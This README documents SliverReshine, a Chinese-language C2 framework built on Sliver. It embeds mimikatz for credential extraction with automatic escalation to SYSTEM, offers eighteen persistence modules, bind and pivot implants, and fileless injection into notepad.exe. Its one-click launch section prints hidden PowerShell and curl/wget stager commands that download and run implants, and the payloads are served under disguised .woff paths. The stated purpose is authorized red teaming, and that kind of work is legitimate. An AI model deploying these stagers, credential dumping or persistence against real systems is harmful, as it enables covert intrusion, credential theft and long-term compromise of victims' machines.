# SliverReshine

![SliverReshine 控制台总览](./images/Pasted%20image%2020260930223627.png)


一个基于Sliver以及Sliver-UI二次开发的C2工具
单个可执行文件内嵌 Sliver 服务端、Web 前端与凭据提取载荷，解压即用，无需额外依赖。

> **免责声明**：本项目仅供**授权**的安全测试、红队演练与安全研究使用。使用者必须确保对目标系统拥有明确的书面授权。未经授权访问他人系统在大多数司法管辖区属于违法行为。作者不对任何滥用行为负责。

---


## 特性
### 获取进程列表并识别杀毒软件
![获取进程列表并识别杀毒软件](./images/Pasted%20image%2020260930223738.png)

### 多种一键权限维持方式
![多种一键权限维持方式](./images/Pasted%20image%2020260930223825.png)

### 显示网络拓扑图
![显示网络拓扑图](./images/Pasted%20image%2020260930224554.png)

### 正向监听 shell（原版无）
![正向监听 shell（原版无）](./images/Pasted%20image%2020260930224643.png)




| 能力              | 说明                                   |
| --------------- | ------------------------------------ |
| **单文件部署**       | 控制台内嵌服务端，`./sliverreshine` 起来就是完整 C2        |
| **Web 控制台**     | React 前端，中英双语，浏览器操作，不用记命令行           |
| **正向连接（Bind）**  | 上游只有反向连接；本项目加了 implant 监听、C2 拨入的完整链路 |
| **多级代理生成**      | 生成页可直接产出 `tcp-pivot` 中转载荷，链路成树       |
| **内嵌 mimikatz** | 一键凭据提取，内存加载或上传执行可选，权限够时自动提权          |
| **权限维持清单**      | 18 个模块的安装/检查/移除，**手动触发**探测           |
| **原始 RPC 控制台**  | 前端直接调 SliverRPC，上游能力没有遗漏             |







---

## 快速开始

### 从 release 下载

```bash
# Windows
unzip sliverreshine-windows-amd64-plain.zip
./sliverreshine.exe

# Linux
unzip sliverreshine-linux-amd64-plain.zip
./sliverreshine
```

首次启动会在控制台打印访问地址与随机密码，浏览器打开即可。


### 从源码构建

```powershell
# 1) 构建服务端（需要 Go 1.25+）
build\build-server.ps1 -SliverDir .\sliver -Targets windows/amd64 -Out .\build\out

# 2) 打包（内嵌服务端 + 前端 + mimikatz）
build\build-release.ps1 -ServerDir .\build\out -GOOS windows -GOARCH amd64
```

产物在 `dist/`。

**改动植入端（`sliver/implant/**`）时，必须先重跑第 1 步。** 植入体源码是
`//go:embed` 进服务端二进制的，只重打包启动器会得到一个仍然内含旧服务端的
启动器 —— 它生成的载荷也是旧的，而且**不会报任何错**。控制台侧改动
（`internal/ui/**`）不受影响。

验证产物（Linux，需 WSL）：

```bash
build/verify-artifact.sh dist/sliverreshine-linux-amd64-upx.zip
```

它会解包、启动控制台与内嵌服务端、验证鉴权门与 API（含 `/api/oneliner/all`），
然后杀掉全部进程并清理。UPX 包尤其要跑：打包会重写加载器，坏掉的产物仍然能解压、
大小也对，只有运行才会暴露；而 Windows 上打包时无法探测 Linux 产物，这个检查会被跳过。


---

## 两个版本的区别

Release 里每个平台提供两个包：

| 包 | 说明 |
|---|---|
| `*-plain.zip` | 未加壳。**推荐。** |
| `*-upx.zip` | 用 [UPX](https://upx.github.io/) 加壳。 |



## 仓库结构

```
.
├── cmd/sliverreshine/              控制台入口
├── internal/
│   ├── embed/               内嵌资源
│   │   ├── serverbin/       服务端载荷（构建时生成，不入库）
│   │   └── mimikatz/        内嵌的 mimikatz.x64.exe
│   ├── launch/              服务端解压与生命周期
│   └── ui/
│       ├── api/             HTTP API
│       └── sliver/          对 SliverRPC 的封装（bind / pivot / 持久化 / 凭据）
├── frontend/                React 前端
├── web/dist/                前端构建产物（构建时生成）
├── build/                   构建脚本
└── sliver/                  Sliver v1.7.3 源码 + 本项目补丁
```

### `sliver/` 是什么

控制台通过 gRPC 与服务端通信，**协议定义必须和内核一致**。本项目给 Sliver 加了 `DialBind` RPC 和 bind 传输，所以：

- `go.mod` 里用 `replace github.com/bishopfox/sliver => ./sliver` 指向本地树
- 用发布版模块编译会得到**没有 `DialBind` 的 v1.7.3**，运行期才失败

### `sliver/` 里改了哪些文件

| 文件 | 改动 |
|---|---|
| `implant/sliver/transports/bind/bind.go` | **新增** — bind 传输的 TLS 监听端 |
| `implant/sliver/transports/bind_session.go` | **新增** — bind 连接建立 |
| `implant/sliver/transports/session.go` | 增加 `tcppivot` 与 bind 的分发 |
| `server/c2/bind.go` | **新增** — 服务端拨号器与重试 |
| `server/rpc/rpc-jobs.go` | `DialBind` 处理器；`KillJob` 容忍无监听记录的作业 |
| `server/rpc/rpc-generate.go` | `bind` 计入 `IsC2Enabled` |
| `server/generate/binaries.go` | 同上 |
| `server/generate/external.go` | 同上 |
| `server/db/models/implant.go` | 同上 |
| `protobuf/clientpb/client.proto` | `DialBindReq` / `DialBind` |
| `protobuf/rpcpb/services.proto` | `rpc DialBind(...)` |
| `protobuf/**/*.pb.go` | 用 protoc 29.3 重新生成 |
| `server/rpc/rpc-backdoor.go` | **修复** — `core.Sessions.Get` 返回 nil 后解引用，导致 server 进程崩溃 |
| `server/rpc/rpc-tunnel.go` | **修复** — 同上的 nil 解引用（缓存重发、ToImplant 发送两处） |
| `server/rpc/rpc-beacons.go` | **修复** — `GetBeacon` 对不存在的 ID 返回 `ErrDatabaseFailure`，改为 `ErrInvalidBeaconID` |
| `server/generate/srdi.go` | **修复** — `is64BitDLL` 切片无长度检查，3 字节输入即可 panic |
| `server/gogo/go.go` | **修复** — garble 环境白名单缺 `LOCALAPPDATA`，导致混淆构建必失败 |

---

## 使用

### 反向连接（默认）

1. **监听器**页 → 起一个 mTLS/HTTP/DNS/WireGuard 监听器
2. **载荷生成**页 → 协议选对应类型，地址填监听器地址 → 生成
3. 在目标上执行 → 会话自动出现在**会话**页

### 正向连接（Bind）

适用于**目标出不了网、但你能路由到它某个端口**的场景。

1. **载荷生成**页 → 协议选 **`Bind (listen / forward)`**，地址填 `目标将监听的地址:端口`
   - 端口必须显式写，bind 传输拒绝无端口的 URL
2. 想办法把载荷投递到目标并执行（这一步需要你已有的通道）
3. 目标上会开一个监听端口
4. **监听器**页 → **正向连接（Bind）** 卡片 → 填目标 `IP:端口` → 启动
5. 服务端每 5 秒重试拨号，直到 implant 接受，会话出现在列表

**注意**：

- 会话建立后该端口会关闭，一次只服务一个会话
- 停止拨号**不会断开**已建立的会话

### 多级代理（Pivot）

1. 在已有会话上起 pivot 监听：`POST /api/sessions/{id}/pivots/listeners`
2. **载荷生成**页 → 协议选 **`TCP Pivot (multi-hop)`**，地址填上一跳的监听地址
3. 从上一跳把新载荷推下去执行
4. **拓扑**页看链路（按 pivot 深度分列）

### 凭据提取

**会话详情 → 凭据提取** 标签页：

- 二进制**已内嵌**，不需要提供路径
- 输出自动解析并存入凭据库
- **权限不足时自动提权到 SYSTEM** 再运行

执行方式有两种，在面板上直接选：

| 方式 | 说明 | 落盘 |
|---|---|---|
| **自动**（默认） | 优先内存加载，无法注入时自动回退到上传执行 | 看情况 |
| **内存加载** | 注入宿主进程执行，**不向目标写任何文件**；无法注入时直接报错，不会默默落盘 | 无 |
| **上传执行** | 写入目标的 `%TEMP%`（回退 `%TMP%`、`C:\Windows\Temp`），运行后自动删除 | 有，运行后清理 |

内存加载的具体路径：

1. 目标载荷是 **.NET 程序集** → 交给 Sliver 的程序集宿主加载
2. 目标载荷是 **DLL** → 在服务端用 sRDI 转成位置无关 shellcode，再注入新建的宿主进程
3. **内嵌 mimikatz（原生 EXE）** → 用构建时由 donut 预生成的 shellcode 注入。原生 EXE 没有导出表，入口点也假定自己拥有进程，Sliver 自身无法反射加载，所以必须先离线转成 shellcode（见下）

宿主进程默认 `C:\Windows\System32\notepad.exe`，可以在面板上改。

#### 启用内嵌 mimikatz 的内存加载

仓库里**不带** shellcode blob（它是构建产物，也是固定特征）。要启用：

```powershell
# 需要 donut：https://github.com/TheWover/donut
build\build-mimikatz-shellcode.ps1 -DonutPath .\tools\donut\donut.exe
```

脚本会把 `mimikatz.x64.exe` 转成 `internal/embed/mimikatz/mimikatz.x64.bin`；`build-release.ps1` 检测到该文件后会自动加上 `mimikatzshellcode` 构建标签。

**没有这个 blob 也能正常构建和使用**，只是内嵌 mimikatz 的内存加载会报错并提示改用上传执行（自动模式则自动回退）。

### 权限维持

**会话详情 → 权限维持** 标签页：


模块目录是静态的，打开就能看到，可以直接安装；只有「是否已安装」这一列需要扫描。

需要管理员的模块（HKLM、服务、计划任务、本地账户）在未提权会话上会失败，控制台的模块目录里标注了 `requiresAdmin`。

---

## 安全（HTTPS 与默认配置）

控制台用 HTTP Basic 认证，**浏览器每条请求都会自动重放这份凭据**。由此有两点要清楚：

- 默认监听 `0.0.0.0:8080` 是**明文**的。Basic 头只是 base64，不是加密 —— 登录口令、命令回显、抓到的明文凭据都会裸奔在链路上。
- 绑在非回环地址又没配 TLS 时，启动会打印一条**醒目警告**（明文、Basic 不是加密、三条修复方案），而不是默默放过。
- 想把警告变成**拒绝启动**，在设置文件里加 `"requireTLS": true`，见下方「强制 TLS」。

### 启用 HTTPS

在设置文件里同时给出证书和私钥：

```json
{
  "addr": "0.0.0.0:8080",
  "tlsCert": "/path/to/console.crt",
  "tlsKey":  "/path/to/console.key"
}
```

两个必须同时给。只给一个会**直接拒绝启动**：猜错一半等于把操作员静默降级回明文，而那正是他配置 TLS 想避免的事。

自签证书：

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout console.key -out console.crt -subj "/CN=console.local"
```

**不改任何配置的最小安全部署**：绑定 `127.0.0.1:8080`，用 SSH 端口转发访问：

```bash
ssh -L 8080:127.0.0.1:8080 user@host
```

### 强制 TLS（requireTLS）

默认行为是「警告后照常启动」，因为绑 `0.0.0.0` 正是远程访问控制台的方式，而隧道 / VLAN / 端口转发后面的部署本进程看不见，不该替操作员做决定。

如果这个部署**永远不该**以明文出现，就在设置文件里写死：

```json
{
  "addr": "0.0.0.0:8080",
  "requireTLS": true
}
```

此时未配 TLS 又绑非回环地址，会在创建监听端口**之前直接拒绝启动**，错误信息给出两条出路：配 `tlsCert`/`tlsKey`，或改绑 `127.0.0.1`。回环地址不受影响 —— 没有链路，就没有明文暴露。

注意：绑 `0.0.0.0` 且已配证书时 `requireTLS` 不做任何事，本来就已经是加密的。


---

## 已知限制


| 限制 | 说明 |
|---|---|
| 包体积大 | 服务端内嵌了 Go/Zig 工具链，压缩后仍有约 200 MB |
| bind 端口运行期不可改 | 换端口需要重新生成载荷 |
| bind 不支持并发会话 | 会话期间监听端口关闭 |
| 权限维持探测留痕 | 扫描会在目标上产生约 18 个进程创建事件 |
| 服务端资产需下载 | 见下 |
| DNS / WireGuard 回连未验证 | 需管理员权限；见下 |
| darwin / freebsd 载荷未运行 | 无对应主机 |
| windows/386 shellcode 未验证 | 需 32 位宿主；见下 |


### 验证到什么程度

本仓库的测试分两层，二者的结论不能互相代替：

| 层次 | 覆盖 | 说明了什么 |
|---|---|---|
| 路由扫描 | 183/183 条 API | 接线、鉴权、参数校验、错误码正确，无崩溃 |
| 载荷回连 | 真实生成并执行 | 载荷能建立会话 |

**已实测回连**：`windows/amd64` 的 exe 与 shellcode（mtls / http / https），
`windows/386` exe，混淆与免杀开关，beacon，`linux/amd64` exe（WSL 内）。

**未验证**：

- **DNS 与 WireGuard 监听器**：两者都需要高于当前测试会话的权限（DNS 需要接管
  域名解析，WireGuard 需要访问仅管理员可读的设备管道），因此仅验证了监听器
  创建成功，**未验证端到端回连**。
- **`windows/386` shellcode**：64 位进程不能执行 32 位代码，因此需要一个 32 位
  宿主才能验证。这不是「测出来坏了」，而是**没法在这里测**。
- **darwin / freebsd 载荷**：没有对应主机，仅验证了能构建。

`build/shellcode_loader/` 提供两个用来做上述验证的小工具（含使用注意）。
### 一键上线

监听器页有「一键上线」面板：**选一个监听器，直接拿到一条能建立会话的命令。**

Windows 与 Linux 各一套模板，另有 certutil / BITS / Python 等备选，**同一个下载
地址**，可随时换一种复制。

**关键设计**：C2 地址、下载地址、端口**全部从你已建的监听器推导**，不让你填。
这三者手工保持一致正是出问题的地方 —— 命令抓一个没人服务的路径、或载荷回连到
没人监听的地址，都会「构建成功、下载成功、然后永远不上线」，而控制台不会有任何
提示。

实测（真实会话）：

    Windows: powershell -nop -w hidden -c "...DownloadFile(...);Start-Process $o"
             → ✅ 会话上线
    Linux:   (curl -fsSL URL -o /tmp/.s || wget -qO /tmp/.s URL) && chmod +x /tmp/.s && /tmp/.s
             → ✅ 会话上线

只有 HTTP 家族的监听器能托管载荷（mTLS / DNS / WireGuard 无法用命令行抓取），
所以面板只列出可用的那些。

**监听器列表每行也有「上线命令」按钮**，直接为该监听器生成 Windows + Linux 两条
命令，不用再回到面板下拉选。两个平台**各自发布到不同路径**
（`/stage-windows.woff` / `/stage-linux.woff`）—— Sliver 默认路径是单个名字，
两条都发到同一路径时第二个会**静默覆盖**第一个，你拿到的两条命令里有一条会跑到
另一个平台的载荷上去。

两个构建并发进行（耗时约等于一个），失败**逐平台报告**：Windows 构失败不影响
拿 Linux 的命令。
### Windows 终端的编码

Windows 上无控制台的 shell 按**控制台代码页**（中文系统是 936）读写，浏览器用
UTF-8。**这两个方向都要转码**，否则：

- 输出：`Microsoft Windows [版本 6.3.9600]` 变成 `[汾 6.3.9600]` —— 文本被**破坏**，
  不是难看而已（GBK 字节按 UTF-8 解出来的字符无法还原）
- 输入：你输入中文路径，shell 收到两三个无关字符，于是「文件名不存在」

转码在控制台侧完成（`ConsoleCodec`），**流式**处理：GBK 是多字节编码，而 tunnel 的
读取边界可能落在字符中间，逐块解码会破坏这些字符，且**坏哪些取决于读边界落在哪** ——
属于「有时输出是错的」这类极难复现的问题。

**不逐字符回显是刻意的。** 无控制台的 `cmd.exe` 不回显按键，但**会回显读到的整行**，
所以再加本地回显会得到 `C:\>whoamiwhoami` —— 看起来像另一条命令。真正的修法是
PTY（ConPTY，Windows 10 1809+），Windows 8.1 没有。

详细分析见 [`docs/windows-terminal-encoding.md`](docs/windows-terminal-encoding.md)。

### Windows 终端的实现与限制

Windows 上的「终端」**不是 PTY**，而是把 `cmd.exe` / `powershell.exe` 当
**无控制台子进程**跑，交换匿名管道。这不是缺陷，是 Sliver 的设计取舍，但它
决定了一类行为：

| 现象 | 原因 |
|---|---|
| `vim` / `top` 按 80×24 渲染，宽终端里错位 | 无 PTY，尺寸无法传达（Windows 上没有可 resize 的对象） |
| Ctrl+C 不产生中断 | 无控制台进程组可送信号 |
| 程序关掉颜色/进度条 | 检测到 stdout 不是终端 |
| PowerShell 可能不出提示符 | 无控制台 + 管道环境下 `[Console]` API 行为与交互式不同 |
| 输入时不回显，按回车才整行出现 | 无控制台，shell 不逐字符回显；它只在读到整行后回显一次 |

**终端页有三种模式**，按「对目标做的假设」从多到少排列：

| 模式 | 做法 | 交互性 | 兼容性 |
|---|---|---|---|
| **Shell**（默认） | 真 shell 走 tunnel | 好（有提示符、内置命令、管道） | 差 —— 需要目标上有可用 shell |
| **Shell 副本** | 先把 shell 二进制复制到可写临时目录，再从那里运行 | 同 Shell | 中 —— 解决**按路径**的策略限制（AppLocker/WDAC/EDR 允许从 temp 执行但禁止 System32）和只读系统盘 |
| **兼容模式** | **完全不用 shell**，每行拆成「程序 + 参数」直接调 Execute | 差 —— 无提示符、无管道/重定向/通配符/内置命令 | **最好** —— 精简容器里即使没有 `/bin/sh` 也能用 |

后两种**完全在控制台侧实现**，不改植入端 —— 所以对**已在运行的会话立即生效**，
不需要重新生成载荷。

兼容模式的取舍写在界面里：管道的构造（`|`、`>`、`&&`、`;`、通配符）会被
**明确拒绝并说明**，而不是当成普通参数传给程序 —— 静默把 `ls | grep x` 当成
`ls` 的三个参数会得到让人费解的结果。
**终端页可以切换 shell**（默认 / `cmd` / `powershell` / `pwsh` / `sh` / `bash`，
或填绝对路径）。这是排查这类问题最直接的对照实验：默认 shell 不出提示符时，
换成 `cmd` 就能确认是不是 PowerShell 的问题。未列出的名字会被拒绝；绝对路径
放行（便携 PowerShell、SysWOW64、加固镜像都属真实场景）。

**shell 启动失败现在会报错。** 植入端本来就回传了 `Response.Err`，但控制台把它
丢弃了 —— 症状是一个永远不出现内容、也不报错的黑色终端，与「靶机只是没输出」
无法区分。现在原因会直接显示在终端里。
### 构建服务端需要先获取资产

`sliver/server/assets/fs/` 下的 `*.zip` 与各平台工具链目录**未入库**（上游 gitignore，合计约 626 MB）。

在**已有资产的树**上构建没问题；从全新克隆构建需要先让 Sliver 下载一次资产：

```bash
# 首次运行会把资产解压到 ~/.sliver
./sliver-server
# 之后重新构建
```

---

## 开发

```bash
# Go 侧
go build ./...
go vet ./internal/ui/sliver/ ./internal/ui/api/
go test ./internal/ui/sliver/ ./internal/ui/api/ ./internal/config/

# 前端
cd frontend
npx tsc --noEmit -p tsconfig.json
npx vitest run
```

### 生成 mimikatz shellcode（可选）

想让内嵌 mimikatz 走内存加载（不写目标磁盘）就需要这一步：

```powershell
# 需要 donut，先放到 tools\donut\ 或 -DonutPath 指定
build\build-mimikatz-shellcode.ps1
```

产物 `internal/embed/mimikatz/mimikatz.x64.bin` 不入库。没生成时构建照常，只是内嵌 mimikatz 的内存加载会提示改用上传执行。

### 修改 protobuf 后

```bash
# 需要 protoc + protoc-gen-go + protoc-gen-go-grpc
cd sliver
make pb
```

---

## 许可

- 本项目：见 `LICENSE`
- 上游 Sliver：`sliver/LICENSE`（GPL-3.0）
- 内嵌 mimikatz：`internal/embed/mimikatz/`（原作者 Benjamin Delpy，见其仓库许可）
-  SliverReshine:https://github.com/9Insomnie/sliver_ui
内嵌第三方二进制是为了部署便利；分发时请遵守各自的许可条款。
